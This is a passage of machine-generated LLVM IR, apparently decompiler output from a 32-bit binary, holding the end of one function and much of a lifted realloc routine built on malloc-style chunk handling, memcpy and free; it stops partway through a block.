dec_label_pc_8053584:                             ; preds = %dec_label_pc_8052e4d, %dec_label_pc_8053573
  %v0_8053587 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053587, i32* %eax.global-to-local, align 4
  %v2_8053589 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053589, i32* @ebx, align 4
  store i32 %v0_8052e1c, i32* @esi, align 4
  store i32 %v0_8052e1b, i32* @edi, align 4
  store i32 %v0_8052e1a, i32* @ebp, align 4
  ret i32 %v0_8053587

; uselistorder directives
  uselistorder i32 %v0_805354a, { 1, 0 }
  uselistorder i32 %v0_805352a, { 1, 0, 2 }
  uselistorder i32 %v2_80534c7, { 1, 0, 2 }
  uselistorder i32 %v0_80534b5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805344c, { 1, 0 }
  uselistorder i32 %v2_805343a, { 1, 0 }
  uselistorder i32 %v1_80533f1, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80533db, { 1, 0, 2 }
  uselistorder i32 %v2_80533cf, { 1, 2, 0 }
  uselistorder i32 %v2_80533ca, { 1, 0, 2 }
  uselistorder i32 %v1_80533ba, { 2, 1, 0 }
  uselistorder i8 %v0_8053388, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805336b, { 1, 0, 2 }
  uselistorder i32 %v0_805341f91, { 2, 0, 1 }
  uselistorder i32 %v0_805342d92, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_8053365, { 2, 1, 0 }
  uselistorder i32 %v8_805333b, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8053338, { 1, 0 }
  uselistorder i32 %v0_8053317, { 1, 0 }
  uselistorder i32 %v2_80532e8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80532e0, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80532cd, { 1, 0 }
  uselistorder i32 %v1_80532c4, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_80532b1, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8053295, { 1, 0, 2 }
  uselistorder i32 %v2_8053281, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805324a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805323e, { 2, 1, 0 }
  uselistorder i32 %v8_805322d, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8053214, { 1, 0, 2 }
  uselistorder i32 %v0_80531b0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8053183, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053179, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805316b, { 1, 0 }
  uselistorder i32 %v1_8053102, { 1, 0 }
  uselistorder i32 %v3_80530f6, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8053106, { 1, 0 }
  uselistorder i32 %v2_80530f0, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80530ed12, { 1, 0 }
  uselistorder i32 %v2_80530e2, { 1, 0 }
  uselistorder i32 %v1_80530c6, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80530c2, { 2, 1, 0 }
  uselistorder i32 %v1_80530be, { 1, 0 }
  uselistorder i32 %v1_80530b2, { 2, 1, 0 }
  uselistorder i32 %v2_80530a8, { 1, 0 }
  uselistorder i32 %v1_80530a5, { 1, 2, 0 }
  uselistorder i32 %v4_8053043, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_805308e, { 1, 0 }
  uselistorder i32 %v0_805305c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805302f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052ffc, { 1, 2, 0 }
  uselistorder i32 %v2_8052fe0, { 1, 0 }
  uselistorder i32 %v1_8052fd6, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052fd1.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052fc1, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052fb8, { 1, 0, 2 }
  uselistorder i32 %v2_8052f94, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052f7c, { 2, 1, 0 }
  uselistorder i32 %v0_8052f68, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052f2e, { 1, 0, 2 }
  uselistorder i32 %v0_8052ffc111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_8052edb, { 1, 0, 2 }
  uselistorder i32 %v2_8052ecd, { 2, 1, 0 }
  uselistorder i32 %v2_8052ea8, { 2, 1, 0 }
  uselistorder i8 %v0_8052e76, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805320e, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8052e5f, { 0, 2, 1 }
  uselistorder i32 %v0_8052e48, { 1, 0 }
  uselistorder i32 %v2_8052e2f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 24, 17, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8061ba0.518, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134617204, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8061880.506, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806186c.503 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_806186c.503 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053584, { 1, 0 }
  uselistorder label %dec_label_pc_8053573, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053566, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053562, { 1, 0 }
  uselistorder label %dec_label_pc_8053558, { 1, 0 }
  uselistorder label %dec_label_pc_8053503, { 1, 0 }
  uselistorder label %dec_label_pc_80534da, { 1, 0 }
  uselistorder label %dec_label_pc_80534c7, { 1, 0 }
  uselistorder label %dec_label_pc_80534b5, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053447, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053442, { 1, 0 }
  uselistorder label %dec_label_pc_8053426, { 1, 0 }
  uselistorder label %dec_label_pc_80533cf, { 1, 0 }
  uselistorder label %dec_label_pc_80533b8, { 1, 0 }
  uselistorder label %dec_label_pc_80533a1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053324, { 1, 0 }
  uselistorder label %dec_label_pc_8053317, { 1, 0 }
  uselistorder label %dec_label_pc_80532d8, { 1, 0 }
  uselistorder label %dec_label_pc_80532b1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8053295, { 1, 0 }
  uselistorder label %dec_label_pc_805327c, { 1, 0 }
  uselistorder label %dec_label_pc_805325e, { 1, 0 }
  uselistorder label %dec_label_pc_8053179, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053171, { 1, 0 }
  uselistorder label %dec_label_pc_805315a, { 1, 0 }
  uselistorder label %dec_label_pc_80530ed, { 1, 0 }
  uselistorder label %dec_label_pc_80530f2.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80530c6, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805304d, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_8052fd4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052fbd, { 1, 0 }
  uselistorder label %dec_label_pc_8052f2b, { 1, 0 }
  uselistorder label %dec_label_pc_8052ffc.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ef8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052e76, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053592 = load i32, i32* @esi, align 4
  %v0_8053593 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805359b = icmp eq i32* %arg1, null
  %v1_80535a0 = icmp eq i1 %v4_805359b, false
  br i1 %v1_80535a0, label %dec_label_pc_80535b2, label %dec_label_pc_80535a2

dec_label_pc_80535a2:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_80535a6 = call i32 @malloc(i32 %arg2)
  store i32 %v1_80535a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80535a6, i32* @ebx, align 4
  br label %dec_label_pc_80538ab

dec_label_pc_80535b2:                             ; preds = %entry
  %v1_80535b2 = icmp eq i32 %arg2, 0
  %v1_80535b4 = icmp eq i1 %v1_80535b2, false
  br i1 %v1_80535b4, label %dec_label_pc_80535c7, label %dec_label_pc_80535b6

dec_label_pc_80535b6:                             ; preds = %dec_label_pc_80535b2
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80535bd = call i32 @free(i32 %tmp7)
  store i32 %v1_80535bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538ab

dec_label_pc_80535c7:                             ; preds = %dec_label_pc_80535b2
  %v2_80535d2 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80535d2, i32* @eax, align 4
  store i32 %v2_80535d2, i32* %stack_var_-60, align 4
  %v2_80535d7 = call i32 @__pthread_return_void(i32 %v2_80535d2, i32 134563799)
  store i32 %v2_80535d7, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b3d0.501 to i32), i32* %stack_var_-60, align 4
  %v1_80535e3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3d0.501 to i32))
  store i32 %v1_80535e3, i32* %eax.global-to-local, align 4
  %v0_80535eb = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_80535eb, -32
  br i1 %tmp20, label %dec_label_pc_8053602, label %dec_label_pc_80535f0

dec_label_pc_80535f0:                             ; preds = %dec_label_pc_80535c7
  %v0_80535f0 = load i32, i32* %stack_var_-60, align 4
  %v1_80535f0 = call i32 @__errno_location(i32 %v0_80535f0)
  store i32 %v1_80535f0, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80535f7 = inttoptr i32 %v1_80535f0 to i32*
  store i32 12, i32* %v1_80535f7, align 4
  br label %dec_label_pc_80538ae

dec_label_pc_8053602:                             ; preds = %dec_label_pc_80535c7
  %v1_8053602 = add i32 %v0_80535eb, 11
  %tmp21 = icmp ult i32 %v1_8053602, 16
  br i1 %tmp21, label %dec_label_pc_8053619, label %dec_label_pc_8053612

dec_label_pc_8053612:                             ; preds = %dec_label_pc_8053602
  %v1_8053612 = and i32 %v1_8053602, -8
  br label %dec_label_pc_8053619

dec_label_pc_8053619:                             ; preds = %dec_label_pc_8053602, %dec_label_pc_8053612
  %stack_var_-40.0 = phi i32 [ %v1_8053612, %dec_label_pc_8053612 ], [ 16, %dec_label_pc_8053602 ]
  %storemerge27 = phi i32 [ %v1_8053612, %dec_label_pc_8053612 ], [ %v1_8053602, %dec_label_pc_8053602 ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_805361d = add i32 %tmp7, -8
  store i32 %v1_805361d, i32* @edi, align 4
  %v1_8053620 = add i32 %tmp7, -4
  %v2_8053620 = inttoptr i32 %v1_8053620 to i32*
  %v3_8053620 = load i32, i32* %v2_8053620, align 4
  store i32 %v3_8053620, i32* @edx, align 4
  %v1_8053625 = and i32 %v3_8053620, -4
  store i32 %v1_8053625, i32* %eax.global-to-local, align 4
  %v2_805362c = and i32 %v3_8053620, 2
  %v3_805362c = icmp eq i32 %v2_805362c, 0
  %v1_805362f = icmp eq i1 %v3_805362c, false
  br i1 %v1_805362f, label %dec_label_pc_80537c9, label %dec_label_pc_8053635

dec_label_pc_8053635:                             ; preds = %dec_label_pc_8053619
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053625, i32* @ebx, align 4
  %v7_805363b = icmp ult i32 %v1_8053625, %stack_var_-40.0
  %v1_805363d = icmp eq i1 %v7_805363b, false
  br i1 %v1_805363d, label %dec_label_pc_8053774, label %dec_label_pc_8053643

dec_label_pc_8053643:                             ; preds = %dec_label_pc_8053635
  %v2_8053643 = add i32 %v1_8053625, %v1_805361d
  store i32 %v2_8053643, i32* @esi, align 4
  %v1_8053646 = load i32, i32* @global_var_806186c.503, align 4
  %v12_8053646 = icmp eq i32 %v2_8053643, %v1_8053646
  %v1_805364c = icmp eq i1 %v12_8053646, false
  %v1_8053686 = add i32 %v2_8053643, 4
  %v2_8053686 = inttoptr i32 %v1_8053686 to i32*
  %v3_8053686 = load i32, i32* %v2_8053686, align 4
  br i1 %v1_805364c, label %dec_label_pc_8053686, label %dec_label_pc_805364e

dec_label_pc_805364e:                             ; preds = %dec_label_pc_8053643
  %v1_8053653 = and i32 %v3_8053686, -4
  %v2_8053656 = add i32 %v1_8053653, %v1_8053625
  store i32 %v2_8053656, i32* %ecx.global-to-local, align 4
  %v1_805365c = add i32 %stack_var_-40.0, 16
  store i32 %v1_805365c, i32* %eax.global-to-local, align 4
  %v7_805365f = icmp ult i32 %v2_8053656, %v1_805365c
  br i1 %v7_805365f, label %dec_label_pc_80536c4, label %dec_label_pc_8053663

dec_label_pc_8053663:                             ; preds = %dec_label_pc_805364e
  %v1_8053663 = urem i32 %v3_8053620, 2
  %v5_8053666 = or i32 %v1_8053663, %stack_var_-40.0
  store i32 %v5_8053666, i32* @edx, align 4
  store i32 %v5_8053666, i32* %v2_8053620, align 4
  %v0_8053671 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053671 = sub i32 %v0_8053671, %stack_var_-40.0
  %v0_8053673 = load i32, i32* @edi, align 4
  %v2_8053673 = add i32 %v0_8053673, %stack_var_-40.0
  store i32 %v2_8053673, i32* %eax.global-to-local, align 4
  %v1_8053676 = or i32 %v2_8053671, 1
  store i32 %v1_8053676, i32* %ecx.global-to-local, align 4
  store i32 %v2_8053673, i32* @global_var_806186c.503, align 4
  %v2_805367e = add i32 %v2_8053673, 4
  %v3_805367e = inttoptr i32 %v2_805367e to i32*
  store i32 %v1_8053676, i32* %v3_805367e, align 4
  br label %dec_label_pc_8053899

dec_label_pc_8053686:                             ; preds = %dec_label_pc_8053643
  %v1_805368b = and i32 %v3_8053686, -2
  store i32 %v1_805368b, i32* %eax.global-to-local, align 4
  %v3_805368e = add i32 %v1_8053686, %v1_805368b
  %v4_805368e = inttoptr i32 %v3_805368e to i8*
  %v5_805368e = load i8, i8* %v4_805368e, align 1
  %v6_805368e = urem i8 %v5_805368e, 2
  %v7_805368e = icmp eq i8 %v6_805368e, 0
  %v1_8053693 = icmp eq i1 %v7_805368e, false
  br i1 %v1_8053693, label %dec_label_pc_80536c4, label %dec_label_pc_8053695

dec_label_pc_8053695:                             ; preds = %dec_label_pc_8053686
  %v1_8053695 = and i32 %v3_8053686, -4
  %v2_805369c = add i32 %v1_8053695, %v1_8053625
  store i32 %v2_805369c, i32* @ebx, align 4
  %v10_805369e = icmp ult i32 %v2_805369c, %stack_var_-40.0
  br i1 %v10_805369e, label %dec_label_pc_80536c4, label %dec_label_pc_80536a4

dec_label_pc_80536a4:                             ; preds = %dec_label_pc_8053695
  %v1_80536a4 = add i32 %v1_8053625, %tmp7
  %v2_80536a4 = inttoptr i32 %v1_80536a4 to i32*
  %v3_80536a4 = load i32, i32* %v2_80536a4, align 4
  store i32 %v3_80536a4, i32* @edx, align 4
  %v1_80536a7 = add i32 %v2_8053643, 12
  %v2_80536a7 = inttoptr i32 %v1_80536a7 to i32*
  %v3_80536a7 = load i32, i32* %v2_80536a7, align 4
  store i32 %v3_80536a7, i32* %eax.global-to-local, align 4
  %v1_80536aa = add i32 %v3_80536a4, 12
  %v2_80536aa = inttoptr i32 %v1_80536aa to i32*
  %v3_80536aa = load i32, i32* %v2_80536aa, align 4
  %v15_80536aa = icmp eq i32 %v3_80536aa, %v2_8053643
  %v1_80536ad = icmp eq i1 %v15_80536aa, false
  br i1 %v1_80536ad, label %dec_label_pc_80536b4, label %dec_label_pc_80536af

dec_label_pc_80536af:                             ; preds = %dec_label_pc_80536a4
  %v1_80536af = add i32 %v3_80536a7, 8
  %v2_80536af = inttoptr i32 %v1_80536af to i32*
  %v3_80536af = load i32, i32* %v2_80536af, align 4
  %v15_80536af = icmp eq i32 %v3_80536af, %v2_8053643
  br i1 %v15_80536af, label %dec_label_pc_80536b9, label %dec_label_pc_80536b4

dec_label_pc_80536b4:                             ; preds = %dec_label_pc_80536af, %dec_label_pc_80536a4
  %v0_80536b4 = call i32 @abort()
  store i32 %v0_80536b4, i32* %eax.global-to-local, align 4
  %v1_80536b9.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80536b9

dec_label_pc_80536b9:                             ; preds = %dec_label_pc_80536af, %dec_label_pc_80536b4
  %v1_80536b9 = phi i32 [ %v3_80536a4, %dec_label_pc_80536af ], [ %v1_80536b9.pre, %dec_label_pc_80536b4 ]
  %v0_80536b9 = phi i32 [ %v3_80536a7, %dec_label_pc_80536af ], [ %v0_80536b4, %dec_label_pc_80536b4 ]
  %v2_80536b9 = add i32 %v1_80536b9, 12
  %v3_80536b9 = inttoptr i32 %v2_80536b9 to i32*
  store i32 %v0_80536b9, i32* %v3_80536b9, align 4
  %v0_80536bc = load i32, i32* @edx, align 4
  %v1_80536bc = load i32, i32* %eax.global-to-local, align 4
  %v2_80536bc = add i32 %v1_80536bc, 8
  %v3_80536bc = inttoptr i32 %v2_80536bc to i32*
  store i32 %v0_80536bc, i32* %v3_80536bc, align 4
  %v0_8053774.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053774

dec_label_pc_80536c4:                             ; preds = %dec_label_pc_8053695, %dec_label_pc_8053686, %dec_label_pc_805364e
  %v1_80536cb = add i32 %stack_var_-40.0, -7
  store i32 %v1_80536cb, i32* %eax.global-to-local, align 4
  store i32 %v1_80536cb, i32* %stack_var_-60, align 4
  %v1_80536cf = call i32 @malloc(i32 %v1_80536cb)
  store i32 %v1_80536cf, i32* %eax.global-to-local, align 4
  store i32 %v1_80536cf, i32* @edx, align 4
  %v1_80536d9 = icmp eq i32 %v1_80536cf, 0
  br i1 %v1_80536d9, label %dec_label_pc_8053895, label %dec_label_pc_80536e1

dec_label_pc_80536e1:                             ; preds = %dec_label_pc_80536c4
  %v1_80536e1 = add i32 %v1_80536cf, -8
  store i32 %v1_80536e1, i32* %ebx.global-to-local, align 4
  %v1_80536e4 = load i32, i32* @esi, align 4
  %v12_80536e4 = icmp eq i32 %v1_80536e1, %v1_80536e4
  %v1_80536e6 = add i32 %v1_80536cf, -4
  %v2_80536e6 = inttoptr i32 %v1_80536e6 to i32*
  %v3_80536e6 = load i32, i32* %v2_80536e6, align 4
  store i32 %v3_80536e6, i32* %eax.global-to-local, align 4
  %v1_80536e9 = icmp eq i1 %v12_80536e4, false
  br i1 %v1_80536e9, label %dec_label_pc_80536f7, label %dec_label_pc_80536eb

dec_label_pc_80536eb:                             ; preds = %dec_label_pc_80536e1
  %v1_80536eb = and i32 %v3_80536e6, -4
  store i32 %v1_80536eb, i32* %eax.global-to-local, align 4
  store i32 %v1_8053625, i32* @edx, align 4
  %v2_80536f2 = add i32 %v1_80536eb, %v1_8053625
  store i32 %v2_80536f2, i32* @ebx, align 4
  br label %dec_label_pc_8053774

dec_label_pc_80536f7:                             ; preds = %dec_label_pc_80536e1
  %v1_80536fb = add i32 %v1_8053625, -4
  store i32 %v1_80536fb, i32* %eax.global-to-local, align 4
  %v2_8053700 = udiv i32 %v1_80536fb, 4
  store i32 %v2_8053700, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80536fb, 37
  br i1 %tmp, label %dec_label_pc_8053719, label %dec_label_pc_8053708

dec_label_pc_8053708:                             ; preds = %dec_label_pc_80536f7
  store i32 %v1_80536cf, i32* %stack_var_-60, align 4
  %v3_805370f = inttoptr i32 %v1_80536cf to i16*
  %v4_805370f = call i32 @memcpy(i16* %v3_805370f, i32 %tmp7, i32 %v1_80536fb)
  store i32 %v4_805370f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053760

dec_label_pc_8053719:                             ; preds = %dec_label_pc_80536f7
  store i32 %tmp7, i32* @esi, align 4
  %v2_8053720 = load i32, i32* %arg1, align 4
  store i32 %v2_8053720, i32* %eax.global-to-local, align 4
  %v2_8053722 = inttoptr i32 %v1_80536cf to i32*
  store i32 %v2_8053720, i32* %v2_8053722, align 4
  %v0_8053724 = load i32, i32* @esi, align 4
  %v1_8053724 = add i32 %v0_8053724, 4
  %v2_8053724 = inttoptr i32 %v1_8053724 to i32*
  %v3_8053724 = load i32, i32* %v2_8053724, align 4
  store i32 %v3_8053724, i32* %eax.global-to-local, align 4
  %v1_8053727 = load i32, i32* @edx, align 4
  %v2_8053727 = add i32 %v1_8053727, 4
  %v3_8053727 = inttoptr i32 %v2_8053727 to i32*
  store i32 %v3_8053724, i32* %v3_8053727, align 4
  %v0_805372a = load i32, i32* @esi, align 4
  %v1_805372a = add i32 %v0_805372a, 8
  %v2_805372a = inttoptr i32 %v1_805372a to i32*
  %v3_805372a = load i32, i32* %v2_805372a, align 4
  store i32 %v3_805372a, i32* %eax.global-to-local, align 4
  %v1_805372d = load i32, i32* @edx, align 4
  %v2_805372d = add i32 %v1_805372d, 8
  %v3_805372d = inttoptr i32 %v2_805372d to i32*
  store i32 %v3_805372a, i32* %v3_805372d, align 4
  %tmp28 = icmp ult i32 %v1_80536fb, 17
  br i1 %tmp28, label %dec_label_pc_8053760, label %dec_label_pc_8053732

dec_label_pc_8053732:                             ; preds = %dec_label_pc_8053719
  %v0_8053732 = load i32, i32* @esi, align 4
  %v1_8053732 = add i32 %v0_8053732, 12
  %v2_8053732 = inttoptr i32 %v1_8053732 to i32*
  %v3_8053732 = load i32, i32* %v2_8053732, align 4
  store i32 %v3_8053732, i32* %eax.global-to-local, align 4
  %v0_8053735 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053738 = load i32, i32* @edx, align 4
  %v2_8053738 = add i32 %v1_8053738, 12
  %v3_8053738 = inttoptr i32 %v2_8053738 to i32*
  store i32 %v3_8053732, i32* %v3_8053738, align 4
  %v0_805373b = load i32, i32* @esi, align 4
  %v1_805373b = add i32 %v0_805373b, 16
  %v2_805373b = inttoptr i32 %v1_805373b to i32*
  %v3_805373b = load i32, i32* %v2_805373b, align 4
  store i32 %v3_805373b, i32* %eax.global-to-local, align 4
  %v1_805373e = load i32, i32* @edx, align 4
  %v2_805373e = add i32 %v1_805373e, 16
  %v3_805373e = inttoptr i32 %v2_805373e to i32*
  store i32 %v3_805373b, i32* %v3_805373e, align 4
  %tmp22 = icmp ult i32 %v0_8053735, 7
  br i1 %tmp22, label %dec_label_pc_8053760, label %dec_label_pc_8053743

dec_label_pc_8053743:                             ; preds = %dec_label_pc_8053732
  %v0_8053743 = load i32, i32* @esi, align 4
  %v1_8053743 = add i32 %v0_8053743, 20
  %v2_8053743 = inttoptr i32 %v1_8053743 to i32*
  %v3_8053743 = load i32, i32* %v2_8053743, align 4
  store i32 %v3_8053743, i32* %eax.global-to-local, align 4
  %v0_8053746 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053749 = load i32, i32* @edx, align 4
  %v2_8053749 = add i32 %v1_8053749, 20
  %v3_8053749 = inttoptr i32 %v2_8053749 to i32*
  store i32 %v3_8053743, i32* %v3_8053749, align 4
  %v0_805374c = load i32, i32* @esi, align 4
  %v1_805374c = add i32 %v0_805374c, 24
  %v2_805374c = inttoptr i32 %v1_805374c to i32*
  %v3_805374c = load i32, i32* %v2_805374c, align 4
  store i32 %v3_805374c, i32* %eax.global-to-local, align 4
  %v1_805374f = load i32, i32* @edx, align 4
  %v2_805374f = add i32 %v1_805374f, 24
  %v3_805374f = inttoptr i32 %v2_805374f to i32*
  store i32 %v3_805374c, i32* %v3_805374f, align 4
  %tmp23 = icmp ult i32 %v0_8053746, 9
  br i1 %tmp23, label %dec_label_pc_8053760, label %dec_label_pc_8053754

dec_label_pc_8053754:                             ; preds = %dec_label_pc_8053743
  %v0_8053754 = load i32, i32* @esi, align 4
  %v1_8053754 = add i32 %v0_8053754, 28
  %v2_8053754 = inttoptr i32 %v1_8053754 to i32*
  %v3_8053754 = load i32, i32* %v2_8053754, align 4
  store i32 %v3_8053754, i32* %eax.global-to-local, align 4
  %v1_8053757 = load i32, i32* @edx, align 4
  %v2_8053757 = add i32 %v1_8053757, 28
  %v3_8053757 = inttoptr i32 %v2_8053757 to i32*
  store i32 %v3_8053754, i32* %v3_8053757, align 4
  %v0_805375a = load i32, i32* @esi, align 4
  %v1_805375a = add i32 %v0_805375a, 32
  %v2_805375a = inttoptr i32 %v1_805375a to i32*
  %v3_805375a = load i32, i32* %v2_805375a, align 4
  store i32 %v3_805375a, i32* %eax.global-to-local, align 4
  %v1_805375d = load i32, i32* @edx, align 4
  %v2_805375d = add i32 %v1_805375d, 32
  %v3_805375d = inttoptr i32 %v2_805375d to i32*
  store i32 %v3_805375a, i32* %v3_805375d, align 4
  br label %dec_label_pc_8053760

dec_label_pc_8053760:                             ; preds = %dec_label_pc_8053743, %dec_label_pc_8053732, %dec_label_pc_8053719, %dec_label_pc_8053708, %dec_label_pc_8053754
  %v0_8053763 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053763 = add i32 %v0_8053763, 8
  store i32 %v1_8053763, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_805376a = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_8053890

dec_label_pc_8053774:                             ; preds = %dec_label_pc_8053635, %dec_label_pc_80536eb, %dec_label_pc_80536b9
  %v1_8053785 = phi i32 [ %v1_8053625, %dec_label_pc_8053635 ], [ %v2_80536f2, %dec_label_pc_80536eb ], [ %v0_8053774.pre, %dec_label_pc_80536b9 ]
  %v5_8053776 = sub i32 %v1_8053785, %stack_var_-40.0
  store i32 %v5_8053776, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_8053776, 16
  br i1 %tmp24, label %dec_label_pc_805377f, label %dec_label_pc_8053791

dec_label_pc_805377f:                             ; preds = %dec_label_pc_8053774
  %v0_805377f = load i32, i32* @edi, align 4
  %v1_805377f = add i32 %v0_805377f, 4
  %v2_805377f = inttoptr i32 %v1_805377f to i32*
  %v3_805377f = load i32, i32* %v2_805377f, align 4
  %v1_8053782 = urem i32 %v3_805377f, 2
  %v2_8053785 = or i32 %v1_8053782, %v1_8053785
  store i32 %v2_8053785, i32* %eax.global-to-local, align 4
  store i32 %v2_8053785, i32* %v2_805377f, align 4
  %v0_805378a = load i32, i32* @edi, align 4
  %v1_805378a = load i32, i32* @ebx, align 4
  %v2_805378a = add i32 %v0_805378a, 4
  %v3_805378a = add i32 %v2_805378a, %v1_805378a
  %v4_805378a = inttoptr i32 %v3_805378a to i32*
  %v5_805378a = load i32, i32* %v4_805378a, align 4
  %v6_805378a = or i32 %v5_805378a, 1
  store i32 %v6_805378a, i32* %v4_805378a, align 4
  br label %dec_label_pc_80537c1

dec_label_pc_8053791:                             ; preds = %dec_label_pc_8053774
  %v0_8053795 = load i32, i32* @edi, align 4
  %v2_8053795 = add i32 %v0_8053795, %stack_var_-40.0
  store i32 %v2_8053795, i32* %eax.global-to-local, align 4
  %v1_8053798 = add i32 %v0_8053795, 4
  %v2_8053798 = inttoptr i32 %v1_8053798 to i32*
  %v3_8053798 = load i32, i32* %v2_8053798, align 4
  %v1_805379b = urem i32 %v3_8053798, 2
  %v5_805379e = or i32 %v1_805379b, %stack_var_-40.0
  store i32 %v5_805379e, i32* %v2_8053798, align 4
  %v0_80537a8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80537aa = or i32 %v0_80537a8, 1
  store i32 %v1_80537aa, i32* @edx, align 4
  %v1_80537ad = load i32, i32* %eax.global-to-local, align 4
  %v2_80537ad = add i32 %v1_80537ad, 4
  %v3_80537ad = inttoptr i32 %v2_80537ad to i32*
  store i32 %v1_80537aa, i32* %v3_80537ad, align 4
  %v0_80537b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80537b0 = load i32, i32* %ecx.global-to-local, align 4
